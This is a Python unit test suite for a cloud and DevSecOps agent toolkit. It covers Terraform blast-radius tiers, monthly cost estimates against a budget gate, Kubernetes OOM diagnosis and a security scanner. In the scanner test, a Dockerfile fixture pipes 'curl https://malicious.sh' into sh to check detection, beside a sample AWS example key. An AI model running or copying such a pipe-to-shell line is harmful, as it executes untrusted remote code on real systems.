"""
Unit Test Suite for Cloud, DevOps & DevSecOps Intelligence (Phase 36 Stage 36.6).
Verifies:
  1. Terraform Plan Parser blast radius classification (Tier 3 on delete/replace).
  2. FinOps Cost Estimator monthly delta calculations and financial budget gate enforcement.
  3. Kubernetes Diagnostician root cause analysis and explicit LAB-TESTED status declaration (Item 105).
  4. DevSecOps Scanner vulnerability, secret, and Dockerfile anti-pattern detection.
"""

import unittest
from agents.cloud.terraform_parser import terraform_parser
from agents.cloud.finops_estimator import finops_estimator
from agents.cloud.k8s_diagnostician import k8s_diagnostician
from agents.cloud.devsecops_scanner import devsecops_scanner
from shared.schemas.action_envelope import ActionTier


class TestPhase36CloudDevOps(unittest.TestCase):
    def test_terraform_plan_destructive_blast_radius(self):
        """Verifies destructive actions (delete, replace) escalate to Tier 3 Destructive."""
        mock_destructive_plan = {
            "resource_changes": [
                {"address": "aws_instance.web", "type": "aws_instance", "change": {"actions": ["delete", "create"]}},
                {"address": "aws_s3_bucket.data", "type": "aws_s3_bucket", "change": {"actions": ["delete"]}}
            ]
        }
        res = terraform_parser.parse_plan(mock_destructive_plan)
        self.assertTrue(res["valid"])
        self.assertTrue(res["has_destructive_changes"])
        self.assertEqual(res["blast_radius_tier"], ActionTier.TIER_3_DESTRUCTIVE.value)
        self.assertEqual(res["destroy_count"], 1)
        self.assertEqual(res["replace_count"], 1)

    def test_terraform_plan_mutating_blast_radius(self):
        """Verifies non-destructive additions and updates classify as Tier 2 Mutating."""
        mock_mutating_plan = {
            "resource_changes": [
                {"address": "aws_instance.worker", "type": "aws_instance", "change": {"actions": ["create"]}},
                {"address": "aws_security_group.allow_tls", "type": "aws_security_group", "change": {"actions": ["update"]}}
            ]
        }
        res = terraform_parser.parse_plan(mock_mutating_plan)
        self.assertTrue(res["valid"])
        self.assertFalse(res["has_destructive_changes"])
        self.assertEqual(res["blast_radius_tier"], ActionTier.TIER_2_MUTATING.value)

    def test_finops_cost_estimation_and_budget_gate(self):
        """Verifies monthly delta cost calculation and budget threshold enforcement."""
        plan_summary = {
            "to_add": [
                {"type": "aws_instance", "attributes": {"instance_type": "m5.large"}},  # ~$70.08
                {"type": "aws_nat_gateway", "attributes": {}}                           # ~$32.40
            ],
            "to_destroy": [
                {"type": "aws_instance", "attributes": {"instance_type": "t3.micro"}}   # ~$7.60
            ],
            "to_replace": []
        }
        # Threshold $50.00; net added is ~$94.88 -> must flag financial approval
        cost = finops_estimator.estimate_plan_cost(plan_summary, budget_threshold_usd=50.0)
        self.assertGreater(cost["net_delta_monthly_cost"], 50.0)
        self.assertTrue(cost["requires_financial_approval"])
        self.assertIn("Estimated Net Cost Change", cost["cost_summary"])

    def test_k8s_diagnostician_lab_tested_status(self):
        """Verifies Kubernetes diagnostician explicitly reports LAB-TESTED maturity (Item 105)."""
        diag = k8s_diagnostician.diagnose_pod_failure(
            pod_name="payment-service-pod-xyz",
            namespace="production",
            pod_status="CrashLoopBackOff",
            exit_code=137
        )
        self.assertEqual(diag["maturity_status"], "LAB-TESTED")
        self.assertEqual(diag["execution_mode"], "LAB_ONLY")
        self.assertIn("Out of Memory (OOMKilled)", diag["root_cause"])
        self.assertIn("resources.limits.memory", diag["recommended_remediation"])
        self.assertGreaterEqual(diag["confidence"], 0.95)

    def test_devsecops_scanner_vulnerabilities_and_secrets(self):
        """Verifies detection of pinned CVE dependencies, root Dockerfile execution, and secrets."""
        # Test requirements scan
        req_content = "urllib3==1.26.15\nrequests==2.31.0\npytest==7.4.0\n"
        req_findings = devsecops_scanner.scan_content("requirements.txt", req_content)
        self.assertTrue(any(f["type"] == "VULNERABLE_DEPENDENCY" and "CVE-2023-45803" in f.get("cve", "") for f in req_findings))

        # Test Dockerfile scan
        docker_content = "FROM python:latest\nUSER root\nRUN curl https://malicious.sh | sh\n"
        docker_findings = devsecops_scanner.scan_content("Dockerfile", docker_content)
        self.assertTrue(any(f["type"] == "DOCKER_ANTI_PATTERN" for f in docker_findings))
        self.assertTrue(any(f["type"] == "CONTAINER_PRIVILEGE" for f in docker_findings))
        self.assertTrue(any(f["type"] == "UNVERIFIED_EXECUTION" for f in docker_findings))

        # Test Secret scan
        secret_content = "AWS_KEY = 'AKIAIOSFODNN7EXAMPLE'\n"
        sec_findings = devsecops_scanner.scan_content("config.py", secret_content)
        self.assertTrue(any(f["type"] == "SECRET_LEAK" for f in sec_findings))


if __name__ == "__main__":
    unittest.main()
